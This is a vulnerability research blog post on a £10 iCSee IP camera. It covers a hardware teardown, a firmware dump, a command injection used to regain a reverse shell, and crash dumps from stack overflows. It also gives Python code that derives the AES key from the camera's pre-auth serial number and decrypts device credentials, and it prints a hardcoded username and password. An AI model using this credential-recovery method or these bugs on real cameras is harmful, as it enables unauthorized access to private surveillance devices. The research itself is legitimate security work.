---
published: true
title: "🎥 [5] Different Camera, Same App"
toc: true
toc_sticky: true
tagline: "I had a quick look on eBay for cameras that use the same App to see if these bugs impact all iCSee cameras; I found this one for £10 which is a STEAL. Let's see if our bugs work on it."
windowGradientStart: rgb(4,4,163)
windowGradientEnd: rgb(16,134,251)
windowBorder: rgb(0, 0, 0)
minimizeButton: rgba(244,243,64,255)
maximizeButton: rgb(203,40,86)
closeButton: rgb(222,199,239)
tags:
  - Hardware Teardown
  - Protocol Analysis
  - Vulnerability Research
---

# Quick Look

I still can't believe this was £10, I honestly thought a picture of the camera would turn up for that price - if you could get some custom firmware on here the value for money would be insane.

I noticed on the listing that the background image used for the screen is identical to the other camera, so I knew these firmware versions would be very similar.

![camera.jpg](/assets/images/icsee_cameras/p6/camera.jpg)

## Teardown

I wanted to see how similar the hardware is to the other camera we have, so first things first lets take it to bits.

![front.jpg](/assets/images/icsee_cameras/p6/front.jpg)

![back.jpg](/assets/images/icsee_cameras/p6/back.jpg)

The main MCU, memory chip, and a few components are different - this is definitely a different revision. However, they have a very similar layout, this one almost looks 'cheaper' than the other. There is also the addition of an unused battery header.

I hooked up to the UART (which is in the same place as the other device), but once again no activity once booted, and the bootloader has a password - however it does tell us what the CPU is:

![bootlog.png](/assets/images/icsee_cameras/p6/bootlog.png)

## Chip Dump

The chip is once again a SOP-8, I figured while I had the device in pieces it makes sense to dump the chip a bit quick and put it back on (while avoiding the tiny resistors that are VERY close to the chip). Nothing interesting to mention here, another job for the XGecu T48.

![chip_gone.jpg](/assets/images/icsee_cameras/p6/chip_gone.jpg)

Running binwalk on the extracted filesystem, we get a lot more extracted files, but there only seems to be a single *squashfs* filesystem in **300000**, all the rest is the Linux kernel and butchered config files:

![extracted_directories.png](/assets/images/icsee_cameras/p6/extracted_directories.png)

Interestingly, there is no **App** binary that we had been analysing previously, but there is an **app.sh** script:

```bash
#!/bin/sh
/usr/bin/Sofia
touch /mnt/mtd/Config/maintain
echo 1 > /mnt/mtd/Config/RebootAbnormal
cp /var/sofia.log  /mnt/mtd/sofia.log
dmesg > /var/halted.log
date >> /var/halted.log
cat /proc/umap/* >> /var/halted.log
cat /proc/meminfo >> /var/halted.log
tail -c 20480 /var/halted.log > /mnt/mtd/halted.log
```

So it looks like the main binary we are interested in on this variant is **Sofia**.

# Getting Another Reverse Shell

Now it is time to move on to poking the camera using the script I composed for the previous camera. The first hurdle I came up against is that the credentials we used previously (which we used *frida* to extract) do not work on the new camera - not ideal! 

I once again used *frida* to cheat and extract the credentials from the App, but I will come back to this and work out how the app is doing it - the extracted credentials for this one (before **XMMD5Encrypt**) are:

| Username | Password | 
| - | - |
| jyfa | k6pyaw |

Cool, so now that we can login, we can look at getting a reverse shell. First, I tried the working method of executing the **iperf** script, but this doesn't work!

![sad.gif](/assets/images/icsee_cameras/p6/sad.gif)

The reason this doesn't work is that there is already an **iperf** file in **/usr/bin** which takes precedence over the file on the SD card. As it is a read-only filesystem, we can't just delete the file and crack on as normal, so we'll need another method.

However, we discovered that this wasn't the only bug in this handler. There is also a command injection we can reach as long as there is some sort of **iperf** file present. This bug is actually much better on this device, as you can perform the injection without needing access to the SD card (if you forget about the remote file write primitive we have).

## Command Injection Workaround

It is worth noting at this point that the file write appeared to be working on this camera, so we can use this to upload files/scripts as we did before.

With the files/scripts uploaded, the only difference is instead of sending a normal **RunIperfTest** request to execute the script, we send two requests:
- The first request uses **chmod +x** to make the script executable
- And the second request runs the script

With that implemented, we have our reverse shell back:

![reverse_shell.png](/assets/images/icsee_cameras/p6/reverse_shell.png)

![we_back.gif](/assets/images/icsee_cameras/p6/we_back.gif)

# Logging in the Legit Way

While auditing for bugs in the last couple of blogs, I came across the concept of a 'random user'. I'd say the credentials we have seen so far are quite random, they aren't words or anything, so I started there.

## **GetRandomUser**

In the handler for message type *0x67c*, there are a bunch of subhandlers for various functionality, we are interested in the **GetRandomUser** subhandler. Let's send a request and see what it comes back with:

```json
{
  "GetRandomUser": {
    "Info": "Vgv4Li9vOiHd0ydApaK6lioLdLndMRRZZiCBTn7lLXs="
  },
  "Name": "GetRandomUser",
  "Ret": 100
}
```

Interesting, so we've got a nice string of base64 that is pretty much guaranteed to be encrypted, lets take a look at the code that generates this. First we can see a string being constructed which contains the username and password (and what looks to be a time?) - this was verified with GDB:

![create_info_string.png](/assets/images/icsee_cameras/p6/create_info_string.png)

This then goes into a function that encrypts the data using AES-CBC (which was derived from looking at comments in other places that this function is used).

I couldn't work out where the encryption key was being set, so I went back to trusty GDB for some clues, and found the following keys being used:

| Camera 1 | Camera 2 |
| - | - |
| *929995317992995e* | *6d5950f7816d9506* |

After grepping a few of those sequences, I realised they looked very similar to the serial numbers of the cameras:

| Camera 1 | Camera 2 |
| - | - |
| *d3179929995e3813* | *bf7816d59506ec06* |

It is clear they are using some strange mangled version of the serial number as the key to this encryption function. As we have two key/serial number combos, it wasn't difficult to work out the operations done on the serial number to get to the keys. Here is some simple Python code that generates a key from the serial number:

```python
def serial_number_to_key(serial_number):
    key = (
        serial_number[5:9] +
        serial_number[9:11] + 
        serial_number[1:3] +
        serial_number[3:7] + 
        serial_number[8:12]
    )
    
    return key
```

Now that we have the key and the encrypted data, we can write some Python code to decrypt it using AES-CBC. At this point I assumed the IV would be null, which turned out to be correct:

```python
def decrypt_user_info(encrypted_string, key_string):
    # Convert string key to bytes by encoding as ASCII
    key = key_string.encode('ascii')
    
    # Decode base64 string
    encrypted_data = base64.b64decode(encrypted_string)
    
    # Create cipher object and decrypt
    cipher = AES.new(key, AES.MODE_CBC, b'\x00' * 0x10)
    decrypted = cipher.decrypt(encrypted_data)
    
    # Try to decode without unpadding first
    try:
        return decrypted.decode('utf-8').rstrip('\x00')
    except UnicodeDecodeError:
        # If that fails, try to decode as much as we can
        return decrypted.hex()
```

After all of this, we can now decrypt the info string and get the random credentials without *frida*!

```
=== GOT AES KEY ===
Serial No: d3179929995e3813
Constructed key: 929995317992995e

...

=== PROCESSING USER CREDS ===
Encrypted: Vgv4Li9vOiHd0ydApaK6lioLdLndMRRZZiCBTn7lLXs=
Key: 929995317992995e
Decrypted: p1:jyfa p2:k6pyaw t:5938

=== GOT RANDOM USER CREDS ===
Username: jyfa
Password: k6pyaw
```

*Note:* There is a check that makes sure the **GetRandomUser** can only be used LAN-side.

## Serial Number?

So, at this stage we are still logging in with the known credentials to hit this handler. At this point, I am getting the serial number with a message that requires authentication (**getSystemInfo**), so I'll need to find a different way to get the serial number. 

I assumed it wouldn't be far away from the **GetRandomUser** subhandler (as it is a requirement to decrypt it), and I came across the **GetDevInfo** subhandler which simply returns the serial number!

```json
{
  "GetDevInfo": {
    "SerialNo": "d3179929995e3813"
  },
  "Name": "GetDevInfo",
  "Ret": 100
}
```

The handler that processes both is pre-auth (otherwise how would the app log in), so we no longer need authentication to get the serial number!

## Full Login Process

Here is the full login process, from being on the same network, to a logged-in session.

![login_summary.png](/assets/images/icsee_cameras/p6/login_summary.png)

Nice, so now we have reversed the crypt, we don't have to extract credentials with frida - and this should be usable with any *iCSee* camera!

# Extra Commands

I noticed a few interesting additional sets of commands when I looked through the binary.

Old:

![old_camera_commands.png](/assets/images/icsee_cameras/p6/old_camera_commands.png)

New:

![new_camera_commands.png](/assets/images/icsee_cameras/p6/new_camera_commands.png)

So the differences are:
- *10CmdsFaceAI* : Suspicious! Seems to be fully featured, but there is a strange flag check at the start of handlers which might block access.
- *10CmdsFeeder* : Probably code left in for some sort of smart pet feeder, mostly stubbed out.
- *14CmdsPgsControl* : This looks like it is for number plate recognition, which is pretty cool - mostly stubbed except some processing of JSON before the handler.

Looks like a new (and pretty small) attack surface! Lets have a quick poke around.

## Bugs

After a quick audit, I came across a couple of surface level issues - I am sure there are more!

### Stack Overflow 

They just can't get enough of **strcpy** can they! Another trivial overflow in the handler for message type *0x8a6* in *14CmdsPgsControl*.

![pgs_stack_overflow.png](/assets/images/icsee_cameras/p6/pgs_stack_overflow.png)

And here is the crash, a straightforward *SIGSEGV* due to us clobbering *r5* with a's:

```
$r0  : 0x6161615d ("]aaa"?)
$r1  : 0xffffffff
$r2  : 0x10f8    
$r3  : 0xb6fcc710  →  <pthread_key_create+0000> ldr r3,  [pc,  #164]	@ 0xb6fcc7bc <pthread_key_create+172>
$r4  : 0x61616155 ("Uaaa"?)
$r5  : 0x6161615d ("]aaa"?)
$r6  : 0xffff0fc0  →  0xf57ff05f
$r7  : 0xffffffff
$r8  : 0x01b68f80  →  0x01b6b0f0  →  0x01ab6208  →  0x01b69790  →  "ble to Int, value:"1"\n\n"
$r9  : 0x0       
$r10 : 0xb2e06b00  →  0x00000001
$r11 : 0x01b6bbf0  →  0x00000001
$r12 : 0xb6f438d0  →  0xb6f26fd4  →  <std::basic_string<char, std::char_traits<char>, std::allocator<char> >::_Rep::_M_dispose(std::allocator<char> const&)+0000> ldr r3,  [pc,  #88]	@ 0xb6f27034 <_ZNSs4_Rep10_M_disposeERKSaIcE+96>
$sp  : 0xb2e064f0  →  0xb6fcc710  →  <pthread_key_create+0000> ldr r3,  [pc,  #164]	@ 0xb6fcc7bc <pthread_key_create+172>
$lr  : 0xb6f27010  →  <std::basic_string<char, std::char_traits<char>, std::allocator<char> >::_Rep::_M_dispose(std::allocator<char> const&)+003c> b 0xb6f27020 <_ZNSs4_Rep10_M_disposeERKSaIcE+76>
$pc  : 0xb6f2a9cc  →   ldr r4,  [r5]
$cpsr: [NEGATIVE zero CARRY overflow interrupt fast thumb]
```

### OOB-Write of Null Byte

I wasn't able to PoC this one, but it is a pretty obvious bug that might work on another device (unless I can figure out how to make it work) - it looks like it might have been stubbed on this camera.

This is in the handler for message type *0xbc6* in *10CmdsFaceAI*:

![faceai_oob_write.png](/assets/images/icsee_cameras/p6/faceai_oob_write.png)

It is possible to provide three controlled lengths such that the **total_len_plus_header** variable overflows to a small value to get past the check. Then a subset of the lengths is used to calculate an offset, which could be a massive value, therefore leading to an OOB-write of a null character.

# Do Other Bugs Work?

I wanted to see if this camera was also impacted by the bugs I discovered on the previous camera, so I fired up GDB and my PoCs and put this table together:

![bugs.png](/assets/images/icsee_cameras/p6/bugs.png)

As you can see, a lot of the bugs we found in the previous camera also work on the new camera, which is great!

## No Canaries!

It is worth saying at this point, that this device doesn't have stack canaries! Which means a decent amount of those stack overflows we discovered in the other camera might be feasible for exploits. Here is an example of a bug we have previously discovered (which was mitigated by the canaries) that now gets control of *pc*.

```
$r0  : 0x0       
$r1  : 0x0132a7cd  →  0x08b6e000
$r2  : 0xe97afdb4
$r3  : 0xe97afdb4
$r4  : 0x61616161 ("aaaa"?)
$r5  : 0x61616161 ("aaaa"?)
$r6  : 0x61616161 ("aaaa"?)
$r7  : 0x013bf950  →  0x005c7198  →  0x001a3b34  →   adds r0,  #20
$r8  : 0xb2cb0778  →  0x00000000
$r9  : 0x0       
$r10 : 0xb2cb0b00  →  0x00000001
$r11 : 0x013bba98  →  0x00000001
$r12 : 0x0       
$sp  : 0xb2cb00b0  →  "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa[...]"
$lr  : 0x00081280  →   movs r3,  r0
$pc  : 0x61616160 ("`aaa"?)
$cpsr: [negative ZERO CARRY overflow interrupt fast THUMB]
```

# Trying (and Failing) to Port Exploits

Now that we have some working bugs and no canaries, getting code execution within Sofia should be a piece of cake (famous last words)! Let's exploit a stack overflow that was not exploitable on the old camera. 

I went with the stack overflow in the handler for *0x43a*, here is the crash for that now that we do not have to worry about canaries:

```
Thread 40 "NetIPManager" received signal SIGSEGV, Segmentation fault.
[Switching to Thread 601.706]
0x61616160 in ?? ()

$r0  : 0xb2d3a468  →  0x00c9c8ec  →  0x00c9c818  →  0x00c9ca20  →  0x00000000
$r1  : 0x1       
$r2  : 0x8b7c881d
$r3  : 0x8b7c881d
$r4  : 0x61616161 ("aaaa"?)
$r5  : 0x61616161 ("aaaa"?)
$r6  : 0x61616161 ("aaaa"?)
$r7  : 0x00029a2c  →   eors r0,  r6
$r8  : 0xb2d3a778  →  0x00000000
$r9  : 0x0       
$r10 : 0xb2d3ab00  →  0x0000000b
$r11 : 0x00f3ca98  →  0x00000001
$r12 : 0xb6f1eecc  →  0x8b7c881d
$sp  : 0xb2d3a5e8  →  "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa[...]"
$lr  : 0x0       
$pc  : 0x61616160 ("`aaa"?)
$cpsr: [negative ZERO CARRY overflow interrupt fast THUMB]
```

As a quick refresher, we are exploiting the **memcpy** overflow in this snippet:

![chosen_overflow.png](/assets/images/icsee_cameras/p6/chosen_overflow.png)

Due the the **strchr** which searches for the '.' character, and the fact this is used to calculate how much to overflow, we need to ensure there are no null characters in our payload. It should be possible to overwrite the first 3 bytes of the address loaded into *pc*, and point it to jump elsewhere without requiring a memory leak.

We should be able to jump to the global buffers for the HTTP shenanigans again, and use this to jump to the larger HTTP buffer payload as before, let me just double check the memory is executable:

```
Start Addr   End Addr       Size     Offset  Perms   objfile
	    0x8000   0x68b000   0x683000        0x0  r-xp   /usr/bin/Sofia
	  0x693000   0x6cb000    0x38000   0x683000  rw-p   /usr/bin/Sofia
	  0x6cb000   0x95b000   0x290000        0x0  rw-p   
	  0xfe2000  0x12b4000   0x2d2000        0x0  rw-p   [heap]
...
```

Uh oh, looks like they learned how to use NX :( Looks like we (unfortunately) need a new strategy!

# Conclusion

In this blog, we got our hands on another camera that uses the same App, and despite it being quite different under the hood, most of our bugs impact both cameras (and we even found a couple of new ones!). We used a slightly different method in the same handler to get our trusty reverse shell binary working, and we can also debug it with GDB. We also tried (and failed) to exploit a stack overflow that is no longer mitigated by canaries, but I'll definitely come back to it!

